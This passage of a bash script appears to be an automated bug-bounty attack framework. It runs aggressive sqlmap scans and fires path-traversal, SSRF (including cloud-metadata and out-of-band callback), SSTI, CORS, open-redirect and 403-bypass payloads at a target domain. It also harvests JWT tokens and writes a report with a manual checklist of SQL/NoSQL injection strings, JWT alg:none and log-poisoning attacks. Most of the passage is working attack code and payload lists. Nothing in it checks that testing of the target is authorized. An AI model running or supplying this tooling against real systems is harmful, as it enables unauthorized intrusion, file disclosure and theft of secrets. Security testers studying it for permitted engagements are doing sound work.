  head -30 "$D_URLS/gf/sqli.txt" 2>/dev/null | \
    while IFS= read -r url; do
      sqlmap -u "$url" \
        --batch --level=5 --risk=3 \
        --threads=10 --random-agent \
        --technique=BEUSTQ \
        --dbs --forms --smart \
        --output-dir="$D_VULN/sqlmap" -q 2>/dev/null
    done
  log "SQLmap done → $D_VULN/sqlmap/"

  # ── LFI ──────────────────────────────────────────────
  info "LFI — path traversal testing..."
  LFI_PAYLOADS=(
    "../../../../../../etc/passwd"
    "../../../../../../../etc/passwd%00"
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "....//....//....//etc//passwd"
    "..%252F..%252Fetc%252Fpasswd"
    "/etc/passwd"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://filter/read=convert.base64-encode/resource=index.php"
    "expect://id"
    "file:///etc/passwd"
    "C:\\Windows\\win.ini"
    "../../../../Windows/win.ini"
  )
  > "$D_VULN/lfi_confirmed.txt"
  while IFS= read -r url; do
    local base param
    base=$(echo "$url" | cut -d'?' -f1)
    param=$(echo "$url" | grep -oP '[?&]([^=]+)=' | head -1 | tr -d '?&=')
    [ -z "$param" ] && continue
    for payload in "${LFI_PAYLOADS[@]}"; do
      local result
      result=$(curl -s -L --max-time 10 \
        "${base}?${param}=${payload}" 2>/dev/null)
      if echo "$result" | grep -qE "root:x:|bin:x:|nobody:|\\[boot loader\\]"; then
        echo "[LFI CONFIRMED] ${base}?${param}=${payload}" >> "$D_VULN/lfi_confirmed.txt"
        break
      fi
    done
  done < <(cat "$D_URLS/gf/lfi.txt" 2>/dev/null | head -50)
  log "LFI confirmed: $(wc -l < "$D_VULN/lfi_confirmed.txt")"

  # ── SSRF ─────────────────────────────────────────────
  info "SSRF — OOB injection..."
  local SSRF_URL="${COLLAB_URL:-oast.pro}"
  SSRF_PAYLOADS=(
    "http://${SSRF_URL}/ssrf"
    "https://${SSRF_URL}/ssrf"
    "http://169.254.169.254/latest/meta-data/"
    "http://[::ffff:169.254.169.254]/latest/meta-data/"
    "http://localhost/"
    "http://0.0.0.0/"
    "dict://${SSRF_URL}:80/"
    "gopher://${SSRF_URL}/_"
  )
  > "$D_VULN/ssrf_hits.txt"
  while IFS= read -r url; do
    for payload in "${SSRF_PAYLOADS[@]}"; do
      curl -s -L --max-time 10 \
        "$(echo "$url" | qsreplace "$payload" 2>/dev/null)" \
        -o /dev/null 2>/dev/null &
    done
  done < <(cat "$D_URLS/gf/ssrf.txt" 2>/dev/null | head -100)
  wait
  log "SSRF payloads sent — check $SSRF_URL for callbacks"

  # ── CORS ─────────────────────────────────────────────
  info "CORS misconfiguration..."
  > "$D_VULN/cors.txt"
  while IFS= read -r url; do
    for origin in "https://evil.com" "null" \
                  "https://${DOMAIN}.evil.com" "https://evil${DOMAIN}"; do
      local resp
      resp=$(curl -s -I --max-time 8 -H "Origin: $origin" "$url" 2>/dev/null)
      if echo "$resp" | grep -qi "access-control-allow-origin: $origin"; then
        local cred
        cred=$(echo "$resp" | grep -i "access-control-allow-credentials")
        echo "[CORS] Origin: $origin | Creds: $cred | $url" >> "$D_VULN/cors.txt"
      fi
    done
  done < "$D_RECON/live_urls.txt"
  log "CORS issues: $(wc -l < "$D_VULN/cors.txt")"

  # ── Open Redirect ─────────────────────────────────────
  info "Open Redirect..."
  cat "$D_URLS/gf/redirect.txt" 2>/dev/null | \
    qsreplace "https://evil.com" 2>/dev/null | \
    while IFS= read -r url; do
      local loc
      loc=$(curl -s -I --max-time 8 -L "$url" 2>/dev/null | \
            grep -i "^location:" | grep -i "evil.com")
      [ -n "$loc" ] && echo "[REDIRECT] $url" >> "$D_VULN/open_redirect.txt"
    done
  log "Open Redirects: $(wc -l < "$D_VULN/open_redirect.txt" 2>/dev/null || echo 0)"

  # ── SSTI ─────────────────────────────────────────────
  info "SSTI — template injection..."
  SSTI_PAYLOADS=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}' '{{7*"7"}}')
  > "$D_VULN/ssti.txt"
  while IFS= read -r url; do
    for payload in "${SSTI_PAYLOADS[@]}"; do
      local result
      result=$(curl -s -L --max-time 8 \
        "$(echo "$url" | qsreplace "$payload" 2>/dev/null)" 2>/dev/null)
      if echo "$result" | grep -qE "\b49\b"; then
        echo "[SSTI] Payload: $payload | $url" >> "$D_VULN/ssti.txt"
        break
      fi
    done
  done < <(cat "$D_URLS/gf/ssti.txt" 2>/dev/null | head -50)
  log "SSTI hits: $(wc -l < "$D_VULN/ssti.txt")"

  # ── 403 Bypass ───────────────────────────────────────
  info "403 Bypass — headers + path tricks..."
  > "$D_VULN/403_bypass.txt"
  while IFS= read -r url; do
    local BYPASS_HEADERS=(
      "X-Original-URL: $url"
      "X-Rewrite-URL: $url"
      "X-Custom-IP-Authorization: 127.0.0.1"
      "X-Forwarded-For: 127.0.0.1"
      "X-Remote-IP: 127.0.0.1"
      "X-Client-IP: 127.0.0.1"
      "X-Host: 127.0.0.1"
      "X-Forwarded-Host: 127.0.0.1"
      "Referer: https://$DOMAIN/admin"
    )
    for h in "${BYPASS_HEADERS[@]}"; do
      local s
      s=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 -H "$h" "$url" 2>/dev/null)
      [ "$s" = "200" ] && echo "[403→200 HEADER] $h | $url" >> "$D_VULN/403_bypass.txt"
    done
    # Path tricks
    for variant in \
      "$(echo "$url" | sed 's|/\([^/]*\)$|/%2e/\1|')" \
      "${url}/" \
      "$(echo "$url" | sed 's|/\([^/]*\)$|/./\1|')" \
      "${url}%20" "${url}..;" "${url}?"; do
      local s
      s=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "$variant" 2>/dev/null)
      [ "$s" = "200" ] && echo "[403→200 PATH] $variant" >> "$D_VULN/403_bypass.txt"
    done
    # HTTP Method override
    for method in "GET" "POST" "PATCH" "PUT" "DELETE"; do
      local s
      s=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 \
        -H "X-HTTP-Method-Override: $method" "$url" 2>/dev/null)
      [ "$s" = "200" ] && echo "[403→200 METHOD] X-HTTP-Method-Override: $method | $url" >> "$D_VULN/403_bypass.txt"
    done
  done < <(head -100 "$D_RECON/status_403.txt" 2>/dev/null)
  log "403 bypasses: $(wc -l < "$D_VULN/403_bypass.txt")"

  # ── IDOR Hints ───────────────────────────────────────
  info "IDOR target identification..."
  grep -iE "id=|user=|account=|order=|invoice=|file=|doc=|record=|profile=" \
    "$D_URLS/urls_with_params.txt" 2>/dev/null | \
    grep -iE "[0-9]" | sort -u > "$D_VULN/idor_targets.txt"
  cat "$D_RECON/status_401.txt" 2>/dev/null >> "$D_VULN/idor_targets.txt"
  log "IDOR targets: $(wc -l < "$D_VULN/idor_targets.txt")"

  # ── JWT Testing ──────────────────────────────────────
  info "JWT analysis..."
  grep -rhoiE 'eyJ[A-Za-z0-9+/=]{10,}\.[A-Za-z0-9+/=]{10,}\.[A-Za-z0-9+/=_-]{10,}' \
    "$D_JS/files/" "$D_URLS/"*.txt 2>/dev/null | \
    sort -u > "$D_VULN/jwt_tokens.txt"
  log "JWT tokens found: $(wc -l < "$D_VULN/jwt_tokens.txt")"

  tlog "Phase 7 done"
}

# ─── PHASE 8: REPORT ──────────────────────────────────────
generate_report() {
  section "PHASE 8 ▸ REPORT GENERATION"
  tlog "Generating report"

  local END_TIME=$(date +%s)
  local ELAPSED=$((END_TIME - START_TIME))
  local DURATION="${ELAPSED}s ($(( ELAPSED/3600 ))h $(( (ELAPSED%3600)/60 ))m $(( ELAPSED%60 ))s)"

  local S=$(wc -l < "$D_SUBS/all_subdomains.txt"  2>/dev/null || echo 0)
  local L=$(wc -l < "$D_RECON/live_urls.txt"      2>/dev/null || echo 0)
  local U=$(wc -l < "$D_URLS/all_urls.txt"        2>/dev/null || echo 0)
  local J=$(wc -l < "$D_JS/js_urls.txt"           2>/dev/null || echo 0)
  local P=$(wc -l < "$D_URLS/urls_with_params.txt" 2>/dev/null || echo 0)
  local SEC=$(cat "$D_JS/secrets_regex.txt" "$D_JS/trufflehog_verified.txt" 2>/dev/null | wc -l)
  local N=$(wc -l < "$D_NUCLEI/nuclei_all.txt"    2>/dev/null || echo 0)
  local XSS=$(wc -l < "$D_VULN/xss_dalfox.txt"   2>/dev/null || echo 0)
  local CORS=$(wc -l < "$D_VULN/cors.txt"         2>/dev/null || echo 0)
  local LFI=$(wc -l < "$D_VULN/lfi_confirmed.txt" 2>/dev/null || echo 0)
  local SSTI=$(wc -l < "$D_VULN/ssti.txt"         2>/dev/null || echo 0)
  local RDR=$(wc -l < "$D_VULN/open_redirect.txt" 2>/dev/null || echo 0)
  local F403=$(wc -l < "$D_VULN/403_bypass.txt"   2>/dev/null || echo 0)
  local IDOR=$(wc -l < "$D_VULN/idor_targets.txt" 2>/dev/null || echo 0)
  local CVE=$(wc -l < "$D_NUCLEI/cves.txt"        2>/dev/null || echo 0)
  local TAKE=$(wc -l < "$D_NUCLEI/takeovers.txt"  2>/dev/null || echo 0)
  local JWT=$(wc -l < "$D_VULN/jwt_tokens.txt"    2>/dev/null || echo 0)

  cat > "$D_REPORT/report.md" << REPORT
# Bug Bounty Recon Report: $DOMAIN
**Date:** $TIMESTAMP | **Duration:** $DURATION | **Tool:** BUG Framework v3.0

---

## Summary Table

| Metric | Count | Severity |
|--------|-------|----------|
| Subdomains | $S | — |
| Live Hosts | $L | — |
| Total URLs | $U | — |
| JS Files | $J | — |
| Param URLs | $P | — |
| **Secrets/Keys** | **$SEC** | 🔴 Critical |
| **Nuclei Findings** | **$N** | 🔴 Mixed |
| **CVEs Found** | **$CVE** | 🔴 High |
| **Subdomain Takeovers** | **$TAKE** | 🔴 Critical |
| **XSS** | **$XSS** | 🟠 High |
| **LFI Confirmed** | **$LFI** | 🔴 Critical |
| **SSTI** | **$SSTI** | 🔴 Critical |
| **CORS Misconfig** | **$CORS** | 🟠 High |
| **Open Redirects** | **$RDR** | 🟡 Medium |
| **403 Bypasses** | **$F403** | 🟠 High |
| **IDOR Targets** | **$IDOR** | 🟠 High |
| **JWT Tokens** | **$JWT** | 🟠 High |

---

## Subdomains (top 100)

\`\`\`
$(head -100 "$D_SUBS/all_subdomains.txt" 2>/dev/null)
\`\`\`

Full list: \`$D_SUBS/all_subdomains.txt\`

---

## Live Hosts by Status Code

### 200 OK
\`\`\`
$(cat "$D_RECON/status_200.txt" 2>/dev/null)
\`\`\`

### 401 Unauthorized — IDOR / BAC targets
\`\`\`
$(cat "$D_RECON/status_401.txt" 2>/dev/null)
\`\`\`

### 403 Forbidden — bypass candidates
\`\`\`
$(cat "$D_RECON/status_403.txt" 2>/dev/null)
\`\`\`

---

## JavaScript Analysis

### JS Files
\`\`\`
$(cat "$D_JS/js_urls.txt" 2>/dev/null)
\`\`\`

### Endpoints Extracted from JS
\`\`\`
$(head -100 "$D_JS/endpoints_from_js.txt" 2>/dev/null)
\`\`\`

### ⚠️ Secrets & Keys Found
\`\`\`
$(cat "$D_JS/secrets_regex.txt" 2>/dev/null)
\`\`\`

### ✅ TruffleHog Verified Secrets
\`\`\`
$(cat "$D_JS/trufflehog_verified.txt" 2>/dev/null)
\`\`\`

### Internal Hosts in JS
\`\`\`
$(cat "$D_JS/internal_hosts.txt" 2>/dev/null)
\`\`\`

---

## Endpoint Discovery

### API Probing Results
\`\`\`
$(cat "$D_ENDPOINTS/api_probe.txt" 2>/dev/null)
\`\`\`

### FFUF Findings
\`\`\`
$(head -100 "$D_ENDPOINTS/ffuf_all.txt" 2>/dev/null)
\`\`\`

---

## Nuclei Findings

### All Findings
\`\`\`
$(cat "$D_NUCLEI/nuclei_all.txt" 2>/dev/null)
\`\`\`

### CVEs
\`\`\`
$(cat "$D_NUCLEI/cves.txt" 2>/dev/null)
\`\`\`

### Takeovers
\`\`\`
$(cat "$D_NUCLEI/takeovers.txt" 2>/dev/null)
\`\`\`

---

## Vulnerability Findings

### XSS (Dalfox)
\`\`\`
$(cat "$D_VULN/xss_dalfox.txt" 2>/dev/null)
\`\`\`

### LFI Confirmed
\`\`\`
$(cat "$D_VULN/lfi_confirmed.txt" 2>/dev/null)
\`\`\`

### SSTI
\`\`\`
$(cat "$D_VULN/ssti.txt" 2>/dev/null)
\`\`\`

### CORS Misconfigurations
\`\`\`
$(cat "$D_VULN/cors.txt" 2>/dev/null)
\`\`\`

### Open Redirects
\`\`\`
$(cat "$D_VULN/open_redirect.txt" 2>/dev/null)
\`\`\`

### 403 Bypasses
\`\`\`
$(cat "$D_VULN/403_bypass.txt" 2>/dev/null)
\`\`\`

### JWT Tokens
\`\`\`
$(cat "$D_VULN/jwt_tokens.txt" 2>/dev/null)
\`\`\`

---

## Manual Testing Checklist

### IDOR
- [ ] Enumerate ID params: $(head -5 "$D_VULN/idor_targets.txt" 2>/dev/null | tr '\n' ' ')
- [ ] Swap numeric IDs between accounts: /api/user/1 → /api/user/2
- [ ] Swap UUIDs between two test accounts
- [ ] Test GUIDs/hashes for predictability
- [ ] Parameter pollution: id=1&id=2
- [ ] Encoded IDs: base64/hex decode then re-encode
- [ ] Check 401 endpoints while authenticated as different user
- [ ] Test indirect references in POST body, headers, cookies

### Authentication & BAC
- [ ] Horizontal: logged as user A, access user B resources
- [ ] Vertical: user-level token → admin endpoints
- [ ] JWT alg:none attack, weak HMAC bruteforce
- [ ] Password reset link reuse / token entropy
- [ ] Account enumeration (timing, response difference)
- [ ] Forced browsing to: $(grep -i "admin\|manage\|dashboard" "$D_ENDPOINTS/api_probe.txt" 2>/dev/null | head -5 | awk '{print $2}' | tr '\n' ' ')
- [ ] Check role in JWT payload — try changing role to admin

### XSS
- [ ] Dalfox confirmed: $(head -3 "$D_VULN/xss_dalfox.txt" 2>/dev/null | tr '\n' ' ')
- [ ] Stored XSS: profile fields, comments, filenames, support tickets
- [ ] DOM XSS: check JS sinks (document.write, innerHTML, eval)
- [ ] Check for CSP and bypass: unsafe-inline, data: scheme
- [ ] Blind XSS in admin panels (use BXSS hunter/interactsh)

### SQLi
- [ ] Review SQLmap results: $D_VULN/sqlmap/
- [ ] Manual: \`' OR '1'='1\`, \`' AND SLEEP(5)--\`, \`' UNION SELECT NULL,NULL--\`
- [ ] Second-order: inject then trigger in a different function
- [ ] NoSQL: \`{"$gt":""}\`, \`{"$ne":null}\`

### LFI / Path Traversal
- [ ] Confirmed: $(head -3 "$D_VULN/lfi_confirmed.txt" 2>/dev/null | tr '\n' ' ')
- [ ] PHP wrappers: php://filter, php://input, data://
- [ ] Log poisoning via User-Agent → then include log file
- [ ] Windows: ../../../../Windows/win.ini

### CSRF
- [ ] Test all state-changing endpoints (no-token, token replay)
- [ ] Check SameSite cookie attribute (Lax/None/Strict)
- [ ] JSON CSRF: change Content-Type to text/plain
- [ ] Endpoints to test: $(grep "200" "$D_ENDPOINTS/api_probe.txt" 2>/dev/null | grep -iE "update|change|edit|delete|create|add|remove|password|email" | head -5 | awk '{print $2}' | tr '\n' ' ')

### SSRF
- [ ] Payloads sent to: $SSRF_URL
- [ ] Try cloud metadata: http://169.254.169.254/
- [ ] Try internal: http://localhost/, http://0.0.0.0/
- [ ] Bypass: http://[::ffff:169.254.169.254]/, decimal IP
- [ ] DNS rebinding, open redirects as SSRF bypass

### CORS
- [ ] Confirmed issues: $(head -3 "$D_VULN/cors.txt" 2>/dev/null | tr '\n' ' ')
- [ ] Test with credentials: does ACAO match + ACAC: true?
- [ ] Exploit: read sensitive data cross-origin

### 403 Bypass
- [ ] Confirmed: $(head -3 "$D_VULN/403_bypass.txt" 2>/dev/null | tr '\n' ' ')
- [ ] Try all HTTP methods: GET/POST/PUT/DELETE/OPTIONS/PATCH

### Subdomain Takeover
- [ ] Nuclei findings: $(cat "$D_NUCLEI/takeovers.txt" 2>/dev/null | head -5 | tr '\n' ' ')
- [ ] CNAME dangling? Check DNS for unregistered third-party services

### API Security
- [ ] GraphQL: send introspection query __schema
- [ ] Mass assignment: POST extra fields like {"role":"admin","isAdmin":true}
- [ ] Rate limiting: brute login, OTP endpoints
- [ ] Exposed: $(grep "200" "$D_ENDPOINTS/api_probe.txt" 2>/dev/null | grep -iE "swagger|graphql|debug|actuator" | awk '{print $2}' | head -5 | tr '\n' ' ')

### Secrets
- [ ] Verify secrets in: $D_JS/secrets_regex.txt
- [ ] TruffleHog verified: $D_JS/trufflehog_verified.txt
- [ ] Test any API keys found for active access
- [ ] Check JWT tokens: $D_VULN/jwt_tokens.txt

---

## File Index

| Path | Description |
|------|-------------|
| $D_SUBS/all_subdomains.txt | All subdomains |
| $D_RECON/live_hosts_full.txt | httpx full output |
| $D_RECON/nmap.txt | Nmap service scan |
| $D_RECON/whatweb.txt | Technology fingerprints |
| $D_URLS/all_urls.txt | All URLs |
| $D_URLS/urls_with_params.txt | Parametrized URLs |
| $D_URLS/gf/ | Categorized vuln URLs |
| $D_JS/js_urls.txt | JS file list |
| $D_JS/endpoints_from_js.txt | JS endpoints |
| $D_JS/secrets_regex.txt | Regex secret hits |
| $D_JS/trufflehog_verified.txt | Verified secrets |
| $D_ENDPOINTS/api_probe.txt | API probe results |
| $D_ENDPOINTS/ffuf_all.txt | FFUF all results |
| $D_NUCLEI/nuclei_all.txt | All nuclei results |
| $D_NUCLEI/cves.txt | CVE matches |
| $D_NUCLEI/takeovers.txt | Takeover findings |
| $D_VULN/xss_dalfox.txt | XSS |
| $D_VULN/lfi_confirmed.txt | LFI |
| $D_VULN/cors.txt | CORS |
| $D_VULN/403_bypass.txt | 403 bypass |
| $D_VULN/jwt_tokens.txt | JWT tokens |
| $D_VULN/sqlmap/ | SQLmap output |

---
*BUG Framework v3.0 — $(date)*
REPORT

  # Summary terminal output
  echo ""
  echo -e "${RED}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
  echo -e "${RED}${BOLD}║              SCAN COMPLETE — BUG v3.0            ║${NC}"
  echo -e "${RED}${BOLD}╠═══════════════════════════════════════════════════╣${NC}"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "Target:" "$DOMAIN"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "Duration:" "$DURATION"
  echo -e "${RED}║${NC}  ──────────────────────────────────────────────  ${RED}║${NC}"
  printf "${GREEN}║${NC}  %-28s %18s  ${GREEN}║${NC}\n" "Subdomains:" "$S"
  printf "${GREEN}║${NC}  %-28s %18s  ${GREEN}║${NC}\n" "Live Hosts:" "$L"
  printf "${GREEN}║${NC}  %-28s %18s  ${GREEN}║${NC}\n" "Total URLs:" "$U"
  printf "${GREEN}║${NC}  %-28s %18s  ${GREEN}║${NC}\n" "JS Files:" "$J"
  printf "${GREEN}║${NC}  %-28s %18s  ${GREEN}║${NC}\n" "Param URLs:" "$P"
  echo -e "${RED}║${NC}  ──────────────────────────────────────────────  ${RED}║${NC}"
  printf "${YELLOW}║${NC}  %-28s %18s  ${YELLOW}║${NC}\n" "Secrets Found:" "$SEC"
  printf "${YELLOW}║${NC}  %-28s %18s  ${YELLOW}║${NC}\n" "JWT Tokens:" "$JWT"
  printf "${YELLOW}║${NC}  %-28s %18s  ${YELLOW}║${NC}\n" "Nuclei Findings:" "$N"
  printf "${YELLOW}║${NC}  %-28s %18s  ${YELLOW}║${NC}\n" "CVEs:" "$CVE"
  echo -e "${RED}║${NC}  ──────────────────────────────────────────────  ${RED}║${NC}"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "Takeovers:" "$TAKE"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "XSS:" "$XSS"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "LFI:" "$LFI"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "SSTI:" "$SSTI"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "CORS:" "$CORS"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "403 Bypasses:" "$F403"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "IDOR Targets:" "$IDOR"
  printf "${RED}║${NC}  %-28s %18s  ${RED}║${NC}\n" "Open Redirects:" "$RDR"
  echo -e "${RED}╚═══════════════════════════════════════════════════╝${NC}"
  echo ""
  echo -e "  ${CYAN}Output:${NC} $OUTPUT_DIR"
  echo -e "  ${CYAN}Report:${NC} $D_REPORT/report.md"
  echo ""
}

# ─── MAIN ─────────────────────────────────────────────────
main() {
  print_banner
  setup_dirs

  echo -e "  ${CYAN}Target:${NC}  $DOMAIN"
  echo -e "  ${CYAN}Threads:${NC} $THREADS"
  echo -e "  ${CYAN}Mode:${NC}    $([ "$PASSIVE_ONLY" = true ] && echo 'Passive' || echo 'AGGRESSIVE')"
  [ -n "$COLLAB_URL" ] && echo -e "  ${CYAN}Collab:${NC}  $COLLAB_URL"
  echo -e "  ${CYAN}Output:${NC}  $OUTPUT_DIR"
  echo ""

  [ "$SKIP_INSTALL" = false ] && check_and_install_tools

  phase_subdomains
  phase_live_hosts
  phase_url_collection
  phase_javascript
  phase_endpoints
  [ "$PASSIVE_ONLY" = false ] && phase_nuclei
  [ "$PASSIVE_ONLY" = false ] && phase_vulns
  generate_report
}

main "$@"
